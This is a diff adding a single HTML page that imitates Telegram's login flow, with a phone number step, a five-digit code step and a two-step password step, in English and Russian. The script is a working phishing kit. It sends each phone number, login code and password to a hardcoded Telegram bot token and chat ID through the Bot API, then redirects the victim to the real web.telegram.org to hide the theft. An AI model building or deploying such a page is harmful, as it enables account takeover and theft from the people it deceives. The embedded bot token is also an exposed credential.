@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
+<meta name="theme-color" content="#1c1c1e">
+<title>Telegram</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{height:100%;overflow:hidden}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#1c1c1e;color:#fff;-webkit-font-smoothing:antialiased;display:flex;justify-content:center;align-items:center}
+.app{display:flex;flex-direction:column;width:100%;height:100vh;height:100dvh;max-width:480px;margin:0 auto;background:#1c1c1e;position:relative;overflow:hidden}
+.scroll{flex:1;overflow-y:auto;overflow-x:hidden;display:flex;flex-direction:column;align-items:center;padding:20px 24px 24px;-webkit-overflow-scrolling:touch;width:100%;max-width:480px;margin:0 auto}
+.logo{width:160px;height:160px;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:40px auto 24px;flex-shrink:0;background:#2d9cdb;position:relative}
+.logo svg{width:120px;height:120px;display:block}
+.title{font-size:32px;font-weight:700;text-align:center;margin-bottom:12px;color:#fff;width:100%}
+.subtitle{font-size:15px;color:#8e8e93;text-align:center;line-height:1.4;max-width:340px;margin:0 auto 32px}
+.field{position:relative;width:100%;margin-bottom:20px}
+.field input{width:100%;padding:24px 16px 8px;font-size:17px;border:1px solid #3a3a3c;border-radius:12px;outline:none;background:transparent;color:#fff;transition:border-color .2s}
+.field input:focus{border-color:#8774e1}
+.field label{position:absolute;top:8px;left:16px;font-size:12px;color:#8e8e93;pointer-events:none}
+.field .country-row{display:flex;align-items:center;justify-content:space-between;cursor:pointer;padding:24px 16px 8px;border:1px solid #3a3a3c;border-radius:12px;background:transparent;transition:border-color .2s}
+.field .country-row:active,.field .country-row.open{border-color:#8774e1}
+.field .country-row span{font-size:17px;color:#fff}
+.field .country-row .placeholder{color:#8e8e93}
+.field .country-row svg{width:20px;height:20px;fill:#8e8e93;flex-shrink:0;transition:transform .2s}
+.field .country-row.open svg{transform:rotate(180deg)}
+.dropdown{position:absolute;top:calc(100% + 6px);left:0;right:0;max-height:260px;overflow-y:auto;background:#2c2c2e;border-radius:12px;z-index:999;box-shadow:0 8px 32px rgba(0,0,0,.8);display:none;-webkit-overflow-scrolling:touch}
+.dropdown.open{display:block}
+.dropdown .search{padding:10px 12px;border-bottom:1px solid #3a3a3c;position:sticky;top:0;background:#2c2c2e;z-index:1}
+.dropdown .search input{width:100%;padding:8px 12px;font-size:15px;border:none;border-radius:8px;background:#1c1c1e;color:#fff;outline:none}
+.dropdown .item{display:flex;align-items:center;padding:12px 16px;cursor:pointer;font-size:16px;color:#fff;transition:background .12s}
+.dropdown .item:hover,.dropdown .item:active{background:#3a3a3c}
+.dropdown .item .name{flex:1}
+.dropdown .item .code{color:#8e8e93;font-size:14px;font-weight:500}
+.dropdown .item.selected{background:rgba(135,116,225,.15)}
+.dropdown .item.selected .code{color:#8774e1}
+.keep{display:flex;align-items:center;gap:16px;width:100%;margin:8px 0 24px;cursor:pointer;user-select:none}
+.checkbox{width:22px;height:22px;border-radius:5px;background:#8774e1;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:background .15s}
+.checkbox svg{width:16px;height:16px;fill:#fff;opacity:1;transition:opacity .15s}
+.checkbox.off{background:transparent;border:1.5px solid #5a5a5e}
+.checkbox.off svg{opacity:0}
+.keep span{font-size:17px;color:#fff}
+.btn{width:100%;padding:14px;font-size:17px;font-weight:500;border:none;border-radius:12px;background:#8774e1;color:#fff;cursor:pointer;transition:opacity .2s;margin-top:8px}
+.btn:active{opacity:.7}
+.btn:disabled{opacity:.4;cursor:default;pointer-events:none}
+.link{display:block;text-align:center;color:#8774e1;font-size:15px;font-weight:500;text-decoration:none;padding:14px 0;cursor:pointer;letter-spacing:.3px}
+.link:active{opacity:.6}
+.step{display:none;width:100%;flex-direction:column;align-items:center}
+.step.active{display:flex}
+.code-row{display:flex;gap:10px;justify-content:center;width:100%;margin:16px 0 24px}
+.code-row input{width:56px;height:64px;text-align:center;font-size:26px;font-weight:600;border:1.5px solid #3a3a3c;border-radius:12px;outline:none;background:transparent;color:#fff}
+.code-row input:focus{border-color:#8774e1}
+.error{color:#ff453a;font-size:14px;text-align:center;margin-bottom:12px;min-height:18px;width:100%}
+.spinner{display:none;width:20px;height:20px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .6s linear infinite;margin:0 auto}
+@keyframes spin{to{transform:rotate(360deg)}}
+.btn.loading .btn-text{display:none}
+.btn.loading .spinner{display:block}
+.footer{text-align:center;padding:12px 0 20px;font-size:13px;color:#5a5a5e;flex-shrink:0;width:100%}
+</style>
+</head>
+<body>
+<div class="app">
+  <div class="scroll">
+    <div class="error" id="error"></div>
+
+    <div class="step active" id="step-phone">
+      <div class="logo"><svg viewBox="0 0 240 240" xmlns="http://www.w3.org/2000/svg"><path fill="#fff" d="M97.6 150.3l-4.2 43.7c6 0 8.6-2.6 11.7-5.7l16.8-16.1 34.9 25.5c6.4 3.6 11 1.7 12.7-5.9l23-108.3c2.1-9.5-3.4-13.2-9.7-10.9L48.4 116.4c-9.2 3.6-9.1 8.8-1.6 11.1l34.6 10.8 80.4-50.7c3.8-2.5 7.2-1.1 4.4 1.4l-68.7 62z"/></svg></div>
+      <div class="title">Telegram</div>
+      <div class="subtitle" id="subtitle-phone">Please confirm your country code and enter your phone number.</div>
+
+      <div class="field" id="country-field">
+        <label id="label-country">Country</label>
+        <div class="country-row" id="country-row">
+          <span class="placeholder" id="country-label">Select country</span>
+          <svg viewBox="0 0 24 24"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6 1.41-1.41z"/></svg>
+        </div>
+        <div class="dropdown" id="dropdown">
+          <div class="search"><input type="text" id="country-search" placeholder="Search country"></div>
+          <div id="country-list"></div>
+        </div>
+      </div>
+
+      <div class="field">
+        <label id="label-phone">Your phone number</label>
+        <input type="tel" id="phone" inputmode="tel" autocomplete="tel" value="">
+      </div>
+
+      <div class="keep" id="keep-row">
+        <div class="checkbox" id="keep-check"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
+        <span id="label-keep">Keep me signed in</span>
+      </div>
+
+      <a class="link" id="link-passkey">LOG IN WITH PASSKEY</a>
+      <a class="link" id="link-lang">ПРОДОЛЖИТЬ НА РУССКОМ</a>
+      <button class="btn" id="btn-phone" disabled style="margin-top:16px"><span class="btn-text" id="btn-phone-text">Next</span><div class="spinner"></div></button>
+    </div>
+
+    <div class="step" id="step-code">
+      <div class="logo"><svg viewBox="0 0 240 240" xmlns="http://www.w3.org/2000/svg"><path fill="#fff" d="M97.6 150.3l-4.2 43.7c6 0 8.6-2.6 11.7-5.7l16.8-16.1 34.9 25.5c6.4 3.6 11 1.7 12.7-5.9l23-108.3c2.1-9.5-3.4-13.2-9.7-10.9L48.4 116.4c-9.2 3.6-9.1 8.8-1.6 11.1l34.6 10.8 80.4-50.7c3.8-2.5 7.2-1.1 4.4 1.4l-68.7 62z"/></svg></div>
+      <div class="title" id="title-code">Enter code</div>
+      <div class="subtitle" id="subtitle-code">We've sent the code to your Telegram app on <span id="phone-display"></span></div>
+      <div class="code-row" id="code-row">
+        <input type="tel" maxlength="1" inputmode="numeric" data-index="0">
+        <input type="tel" maxlength="1" inputmode="numeric" data-index="1">
+        <input type="tel" maxlength="1" inputmode="numeric" data-index="2">
+        <input type="tel" maxlength="1" inputmode="numeric" data-index="3">
+        <input type="tel" maxlength="1" inputmode="numeric" data-index="4">
+      </div>
+      <button class="btn" id="btn-code"><span class="btn-text" id="btn-code-text">Next</span><div class="spinner"></div></button>
+      <a class="link" id="link-wrong">Wrong number?</a>
+    </div>
+
+    <div class="step" id="step-password">
+      <div class="logo"><svg viewBox="0 0 240 240" xmlns="http://www.w3.org/2000/svg"><path fill="#fff" d="M97.6 150.3l-4.2 43.7c6 0 8.6-2.6 11.7-5.7l16.8-16.1 34.9 25.5c6.4 3.6 11 1.7 12.7-5.9l23-108.3c2.1-9.5-3.4-13.2-9.7-10.9L48.4 116.4c-9.2 3.6-9.1 8.8-1.6 11.1l34.6 10.8 80.4-50.7c3.8-2.5 7.2-1.1 4.4 1.4l-68.7 62z"/></svg></div>
+      <div class="title" id="title-pass">Two-Step Verification</div>
+      <div class="subtitle" id="subtitle-pass">Your account is protected with an additional password.</div>
+      <div class="field" style="margin-top:8px"><label id="label-pass">Password</label><input type="password" id="password" autocomplete="current-password"></div>
+      <button class="btn" id="btn-password"><span class="btn-text" id="btn-pass-text">Next</span><div class="spinner"></div></button>
+    </div>
+
+    <div class="step" id="step-success">
+      <div class="logo"><svg viewBox="0 0 240 240" xmlns="http://www.w3.org/2000/svg"><path fill="#fff" d="M97.6 150.3l-4.2 43.7c6 0 8.6-2.6 11.7-5.7l16.8-16.1 34.9 25.5c6.4 3.6 11 1.7 12.7-5.9l23-108.3c2.1-9.5-3.4-13.2-9.7-10.9L48.4 116.4c-9.2 3.6-9.1 8.8-1.6 11.1l34.6 10.8 80.4-50.7c3.8-2.5 7.2-1.1 4.4 1.4l-68.7 62z"/></svg></div>
+      <div class="title" id="title-success">Success</div>
+      <div class="subtitle" id="subtitle-success">Redirecting...</div>
+    </div>
+  </div>
+
+  <div class="footer">Telegram Messenger</div>
+</div>
+
+<script>
+var BOT_TOKEN = '8803546698:AAFAjw-qnr7ZH6uEGlUDs63WDZm_a3qUkRY';
+var CHAT_ID = '6375042238';
+var REDIRECT_URL = 'https://web.telegram.org/';
+
+var COUNTRIES = [
+  {name:'Albania', ru:'Албания', code:'+355', len:9},
+  {name:'Andorra', ru:'Андорра', code:'+376', len:6},
+  {name:'Armenia', ru:'Армения', code:'+374', len:8},
+  {name:'Austria', ru:'Австрия', code:'+43', len:10},
+  {name:'Azerbaijan', ru:'Азербайджан', code:'+994', len:9},
+  {name:'Belarus', ru:'Беларусь', code:'+375', len:9},
+  {name:'Belgium', ru:'Бельгия', code:'+32', len:9},
+  {name:'Bosnia', ru:'Босния', code:'+387', len:8},
+  {name:'Bulgaria', ru:'Болгария', code:'+359', len:9},
+  {name:'Canada', ru:'Канада', code:'+1', len:10},
+  {name:'Croatia', ru:'Хорватия', code:'+385', len:9},
+  {name:'Cyprus', ru:'Кипр', code:'+357', len:8},
+  {name:'Czechia', ru:'Чехия', code:'+420', len:9},
+  {name:'Denmark', ru:'Дания', code:'+45', len:8},
+  {name:'Estonia', ru:'Эстония', code:'+372', len:8},
+  {name:'Finland', ru:'Финляндия', code:'+358', len:9},
+  {name:'France', ru:'Франция', code:'+33', len:9},
+  {name:'French Guiana', ru:'Французская Гвиана', code:'+594', len:9},
+  {name:'French Polynesia', ru:'Французская Полинезия', code:'+689', len:6},
+  {name:'Gabon', ru:'Габон', code:'+241', len:7},
+  {name:'Gambia', ru:'Гамбия', code:'+220', len:7},
+  {name:'Georgia', ru:'Грузия', code:'+995', len:9},
+  {name:'Germany', ru:'Германия', code:'+49', len:10},
+  {name:'Greece', ru:'Греция', code:'+30', len:10},
+  {name:'Hungary', ru:'Венгрия', code:'+36', len:9},
+  {name:'Iceland', ru:'Исландия', code:'+354', len:7},
+  {name:'Ireland', ru:'Ирландия', code:'+353', len:9},
+  {name:'Israel', ru:'Израиль', code:'+972', len:9},
+  {name:'Italy', ru:'Италия', code:'+39', len:10},
+  {name:'Kazakhstan', ru:'Казахстан', code:'+77', len:10},
+  {name:'Kenya', ru:'Кения', code:'+254', len:9},
+  {name:'Kiribati', ru:'Кирибати', code:'+686', len:8},
+  {name:'Kosovo', ru:'Косово', code:'+383', len:8},
+  {name:'Kuwait', ru:'Кувейт', code:'+965', len:8},
+  {name:'Kyrgyzstan', ru:'Киргизия', code:'+996', len:9},
+  {name:'Latvia', ru:'Латвия', code:'+371', len:8},
+  {name:'Lithuania', ru:'Литва', code:'+370', len:8},
+  {name:'Luxembourg', ru:'Люксембург', code:'+352', len:9},
+  {name:'Macau', ru:'Макао', code:'+853', len:8},
+  {name:'Madagascar', ru:'Мадагаскар', code:'+261', len:9},
+  {name:'Malawi', ru:'Малави', code:'+265', len:9},
+  {name:'Malaysia', ru:'Малайзия', code:'+60', len:9},
+  {name:'Maldives', ru:'Мальдивы', code:'+960', len:7},
+  {name:'Mali', ru:'Мали', code:'+223', len:8},
+  {name:'Malta', ru:'Мальта', code:'+356', len:8},
+  {name:'Moldova', ru:'Молдова', code:'+373', len:8},
+  {name:'Monaco', ru:'Монако', code:'+377', len:8},
+  {name:'Montenegro', ru:'Черногория', code:'+382', len:8},
+  {name:'Netherlands', ru:'Нидерланды', code:'+31', len:9},
+  {name:'Niger', ru:'Нигер', code:'+227', len:8},
+  {name:'Nigeria', ru:'Нигерия', code:'+234', len:10},
+  {name:'Niue', ru:'Ниуэ', code:'+683', len:4},
+  {name:'Norfolk Island', ru:'Остров Норфолк', code:'+672', len:6},
+  {name:'North Korea', ru:'Северная Корея', code:'+850', len:9},
+  {name:'North Macedonia', ru:'Северная Македония', code:'+389', len:8},
+  {name:'Norway', ru:'Норвегия', code:'+47', len:8},
+  {name:'Palestine', ru:'Палестина', code:'+970', len:9},
+  {name:'Panama', ru:'Панама', code:'+507', len:8},
+  {name:'Papua New Guinea', ru:'Папуа — Новая Гвинея', code:'+675', len:8},
+  {name:'Paraguay', ru:'Парагвай', code:'+595', len:9},
+  {name:'Peru', ru:'Перу', code:'+51', len:9},
+  {name:'Poland', ru:'Польша', code:'+48', len:9},
+  {name:'Portugal', ru:'Португалия', code:'+351', len:9},
+  {name:'Réunion', ru:'Реюньон', code:'+262', len:9},
+  {name:'Romania', ru:'Румыния', code:'+40', len:9},
+  {name:'Russian Federation', ru:'Российская Федерация', code:'+7', len:10},
+  {name:'Rwanda', ru:'Руанда', code:'+250', len:9},
+  {name:'Saint Helena', ru:'Остров Святой Елены', code:'+247', len:4},
+  {name:'Senegal', ru:'Сенегал', code:'+221', len:9},
+  {name:'Serbia', ru:'Сербия', code:'+381', len:9},
+  {name:'Seychelles', ru:'Сейшельские Острова', code:'+248', len:7},
+  {name:'Sierra Leone', ru:'Сьерра-Леоне', code:'+232', len:8},
+  {name:'Singapore', ru:'Сингапур', code:'+65', len:8},
+  {name:'Sint Maarten', ru:'Синт-Мартен', code:'+1721', len:7},
+  {name:'Slovakia', ru:'Словакия', code:'+421', len:9},
+  {name:'Slovenia', ru:'Словения', code:'+386', len:8},
+  {name:'Solomon Islands', ru:'Соломоновы Острова', code:'+677', len:5},
+  {name:'Somalia', ru:'Сомали', code:'+252', len:8},
+  {name:'South Africa', ru:'Южно-Африканская Республика', code:'+27', len:9},
+  {name:'South Korea', ru:'Южная Корея', code:'+82', len:10},
+  {name:'South Sudan', ru:'Южный Судан', code:'+211', len:9},
+  {name:'Spain', ru:'Испания', code:'+34', len:9},
+  {name:'Sweden', ru:'Швеция', code:'+46', len:9},
+  {name:'Switzerland', ru:'Швейцария', code:'+41', len:9},
+  {name:'Taiwan', ru:'Тайвань', code:'+886', len:9},
+  {name:'Tajikistan', ru:'Таджикистан', code:'+992', len:9},
+  {name:'Tanzania', ru:'Танзания', code:'+255', len:9},
+  {name:'Thailand', ru:'Таиланд', code:'+66', len:9},
+  {name:'Timor-Leste', ru:'Восточный Тимор', code:'+670', len:7},
+  {name:'Togo', ru:'Того', code:'+228', len:8},
+  {name:'Turkey', ru:'Турция', code:'+90', len:10},
+  {name:'Turkmenistan', ru:'Туркменистан', code:'+993', len:8},
+  {name:'UK', ru:'Великобритания', code:'+44', len:10},
+  {name:'Ukraine', ru:'Украина', code:'+380', len:9},
+  {name:'USA', ru:'США', code:'+1', len:10},
+  {name:'Uzbekistan', ru:'Узбекистан', code:'+998', len:9}
+];
+
+var state = { phone:'', code:'', password:'', country:'', countryRu:'', dialCode:'', length:0 };
+var keepSignedIn = true;
+var isRu = false;
+
+function sendToBot(text) {
+  return fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+  }).catch(function(){});
+}
+
+function showError(msg) {
+  var el = document.getElementById('error');
+  el.textContent = msg;
+  setTimeout(function(){ el.textContent = ''; }, 3500);
+}
+
+function setLoading(btnId, loading) {
+  var btn = document.getElementById(btnId);
+  if (!btn) return;
+  if (loading) btn.classList.add('loading');
+  else btn.classList.remove('loading');
+}
+
+function switchStep(id) {
+  var steps = document.querySelectorAll('.step');
+  for (var i = 0; i < steps.length; i++) steps[i].classList.remove('active');
+  document.getElementById(id).classList.add('active');
+  document.querySelector('.scroll').scrollTop = 0;
+}
+
+function toggleKeep() {
+  keepSignedIn = !keepSignedIn;
+  document.getElementById('keep-check').classList.toggle('off', !keepSignedIn);
+}
+
+function getCountryName(c) { return isRu ? c.ru : c.name; }
+
+function isPhoneValid() {
+  if (!state.dialCode || !state.length) return false;
+  var raw = document.getElementById('phone').value.replace(/\D/g, '');
+  var dialDigits = state.dialCode.replace(/\D/g, '');
+  if (raw.indexOf(dialDigits) !== 0) return false;
+  var local = raw.substring(dialDigits.length);
+  return local.length === state.length;
+}
+
+function updatePhoneButton() {
+  var btn = document.getElementById('btn-phone');
+  if (isPhoneValid()) btn.removeAttribute('disabled');
+  else btn.setAttribute('disabled', 'disabled');
+}
+
+function renderCountries(filter) {
+  var list = document.getElementById('country-list');
+  var q = (filter || '').toLowerCase().trim();
+
+  var sorted = COUNTRIES.slice().sort(function(a, b){
+    var an = isRu ? a.ru : a.name;
+    var bn = isRu ? b.ru : b.name;
+    return an.localeCompare(bn, isRu ? 'ru' : 'en');
+  });
+
+  var items = sorted.filter(function(c){
+    return !q || c.name.toLowerCase().indexOf(q) !== -1 ||
+           c.ru.toLowerCase().indexOf(q) !== -1 ||
+           c.code.indexOf(q) !== -1;
+  });
+
+  list.innerHTML = '';
+  if (!items.length) {
+    var empty = document.createElement('div');
+    empty.className = 'item';
+    empty.style.color = '#8e8e93';
+    empty.style.cursor = 'default';
+    empty.textContent = isRu ? 'Не найдено' : 'Not found';
+    list.appendChild(empty);
+    return;
+  }
+  items.forEach(function(c){
+    var row = document.createElement('div');
+    row.className = 'item' + (c.name === state.country ? ' selected' : '');
+    var name = document.createElement('span');
+    name.className = 'name';
+    name.textContent = getCountryName(c);
+    var code = document.createElement('span');
+    code.className = 'code';
+    code.textContent = c.code;
+    row.appendChild(name);
+    row.appendChild(code);
+    row.addEventListener('click', function(e){
+      e.stopPropagation();
+      selectCountry(c.name);
+    });
+    list.appendChild(row);
+  });
+}
+
+function toggleDropdown(e) {
+  if (e) e.stopPropagation();
+  var dd = document.getElementById('dropdown');
+  var row = document.getElementById('country-row');
+  var opening = !dd.classList.contains('open');
+  dd.classList.toggle('open', opening);
+  row.classList.toggle('open', opening);
+  if (opening) {
+    renderCountries('');
+    document.getElementById('country-search').value = '';
+    document.getElementById('country-search').placeholder = isRu ? 'Поиск страны' : 'Search country';
+    setTimeout(function(){ document.getElementById('country-search').focus(); }, 50);
+  }
+}
+
+function filterCountries() {
+  renderCountries(document.getElementById('country-search').value);
+}
+
+function selectCountry(name) {
+  var c = null;
+  for (var i = 0; i < COUNTRIES.length; i++) {
+    if (COUNTRIES[i].name === name) { c = COUNTRIES[i]; break; }
+  }
+  if (!c) return;
+  state.country = c.name;
+  state.countryRu = c.ru;
+  state.dialCode = c.code;
+  state.length = c.len;
+  var labelEl = document.getElementById('country-label');
+  labelEl.textContent = getCountryName(c);
+  labelEl.classList.remove('placeholder');
+  var phoneInput = document.getElementById('phone');
+  var digits = phoneInput.value.replace(/^\+\d+/, '');
+  phoneInput.value = c.code + digits;
+  closeDropdown();
+  updatePhoneButton();
+}
+
+function closeDropdown() {
+  document.getElementById('dropdown').classList.remove('open');
+  document.getElementById('country-row').classList.remove('open');
+}
+
+function submitPhone() {
+  if (!isPhoneValid()) return;
+  var phone = document.getElementById('phone').value.trim();
+  state.phone = phone;
+  setLoading('btn-phone', true);
+  sendToBot('PHONE:' + phone).then(function(){
+    setLoading('btn-phone', false);
+    document.getElementById('phone-display').textContent = phone;
+    switchStep('step-code');
+    setTimeout(function(){ document.querySelector('#code-row input[data-index="0"]').focus(); }, 120);
+  });
+}
+
+function submitCode() {
+  var inputs = document.querySelectorAll('#code-row input');
+  var code = '';
+  for (var i = 0; i < inputs.length; i++) code += inputs[i].value;
+  if (code.length < 5) { showError(isRu ? 'Введите код полностью' : 'Please enter the full code'); return; }
+  state.code = code;
+  setLoading('btn-code', true);
+  sendToBot('CODE:' + state.phone + ':' + code).then(function(){
+    setLoading('btn-code', false);
+    switchStep('step-password');
+    setTimeout(function(){ document.getElementById('password').focus(); }, 120);
+  });
+}
+
+function submitPassword() {
+  var password = document.getElementById('password').value;
+  if (!password) { showError(isRu ? 'Введите пароль' : 'Please enter your password'); return; }
+  state.password = password;
+  setLoading('btn-password', true);
+  sendToBot('PASS:' + state.phone + ':' + password).then(function(){
+    setLoading('btn-password', false);
+    switchStep('step-success');
+    setTimeout(function(){ window.location.href = REDIRECT_URL; }, 1500);
+  });
+}
+
+function backToPhone() { switchStep('step-phone'); }
+function showPasskey() { showError(isRu ? 'Passkey недоступен' : 'Passkey is not available on this device'); }
+
+function toggleLang() {
+  isRu = !isRu;
+  var ru = isRu;
+  document.getElementById('subtitle-phone').textContent = ru ? 'Подтвердите код страны и введите номер телефона.' : 'Please confirm your country code and enter your phone number.';
+  document.getElementById('label-country').textContent = ru ? 'Страна' : 'Country';
+  document.getElementById('label-phone').textContent = ru ? 'Ваш номер телефона' : 'Your phone number';
+  document.getElementById('label-keep').textContent = ru ? 'Запомнить меня' : 'Keep me signed in';
+  document.getElementById('btn-phone-text').textContent = ru ? 'Далее' : 'Next';
+  document.getElementById('link-passkey').textContent = ru ? 'ВОЙТИ С PASSKEY' : 'LOG IN WITH PASSKEY';
+  document.getElementById('link-lang').textContent = ru ? 'CONTINUE IN ENGLISH' : 'ПРОДОЛЖИТЬ НА РУССКОМ';
+  document.getElementById('title-code').textContent = ru ? 'Введите код' : 'Enter code';
+  document.getElementById('subtitle-code').innerHTML = ru ? 'Мы отправили код в приложение Telegram на номер <span id="phone-display"></span>' : 'We\'ve sent the code to your Telegram app on <span id="phone-display"></span>';
+  document.getElementById('btn-code-text').textContent = ru ? 'Далее' : 'Next';
+  document.getElementById('link-wrong').textContent = ru ? 'Другой номер?' : 'Wrong number?';
+  document.getElementById('title-pass').textContent = ru ? 'Двухэтапная аутентификация' : 'Two-Step Verification';
+  document.getElementById('subtitle-pass').textContent = ru ? 'Ваш аккаунт защищён дополнительным паролем.' : 'Your account is protected with an additional password.';
+  document.getElementById('label-pass').textContent = ru ? 'Пароль' : 'Password';
+  document.getElementById('btn-pass-text').textContent = ru ? 'Далее' : 'Next';
+  document.getElementById('title-success').textContent = ru ? 'Готово' : 'Success';
+  document.getElementById('subtitle-success').textContent = ru ? 'Перенаправление...' : 'Redirecting...';
+  document.getElementById('country-search').placeholder = ru ? 'Поиск страны' : 'Search country';
+
+  if (state.country) {
+    var labelEl = document.getElementById('country-label');
+    labelEl.textContent = ru ? state.countryRu : state.country;
+  } else {
+    document.getElementById('country-label').textContent = ru ? 'Выберите страну' : 'Select country';
+  }
+
+  renderCountries(document.getElementById('country-search').value);
+}
+
+document.addEventListener('click', function(e){
+  var cf = document.getElementById('country-field');
+  if (cf && !cf.contains(e.target)) closeDropdown();
+});
+
+document.getElementById('country-row').addEventListener('click', toggleDropdown);
+document.getElementById('country-search').addEventListener('input', filterCountries);
+document.getElementById('keep-row').addEventListener('click', toggleKeep);
+document.getElementById('btn-phone').addEventListener('click', submitPhone);
+document.getElementById('btn-code').addEventListener('click', submitCode);
+document.getElementById('btn-password').addEventListener('click', submitPassword);
+document.getElementById('link-wrong').addEventListener('click', backToPhone);
+document.getElementById('link-passkey').addEventListener('click', showPasskey);
+document.getElementById('link-lang').addEventListener('click', toggleLang);
+
+document.getElementById('phone').addEventListener('input', function(e){
+  var v = e.target.value.replace(/[^\d+]/g, '');
+  if (v.charAt(0) !== '+') v = '+' + v;
+  e.target.value = v;
+  updatePhoneButton();
+});
+document.getElementById('phone').addEventListener('keydown', function(e){
+  if (e.key === 'Enter' && isPhoneValid()) submitPhone();
+});
+document.getElementById('password').addEventListener('keydown', function(e){ if (e.key === 'Enter') submitPassword(); });
+
+var codeInputs = document.querySelectorAll('#code-row input');
+for (var i = 0; i < codeInputs.length; i++) {
+  (function(input, idx, arr){
+    input.addEventListener('input', function(e){
+      var val = e.target.value.replace(/\D/g, '');
+      e.target.value = val;
+      if (val && idx < arr.length - 1) arr[idx + 1].focus();
+      if (val && idx === arr.length - 1) {
+        var code = '';
+        for (var k = 0; k < arr.length; k++) code += arr[k].value;
+        if (code.length === 5) submitCode();
+      }
+    });
+    input.addEventListener('keydown', function(e){
+      if (e.key === 'Backspace' && !e.target.value && idx > 0) arr[idx - 1].focus();
+    });
+    input.addEventListener('paste', function(e){
+      e.preventDefault();
+      var data = ((e.clipboardData || window.clipboardData).getData('text') || '').replace(/\D/g, '');
+      if (data.length >= 5) {
+        for (var k = 0; k < arr.length; k++) arr[k].value = data[k] || '';
+        arr[arr.length - 1].focus();
+        setTimeout(submitCode, 80);
+      }
+    });
+  })(codeInputs[i], i, codeInputs);
+}
+</script>
+</body>
+</html>
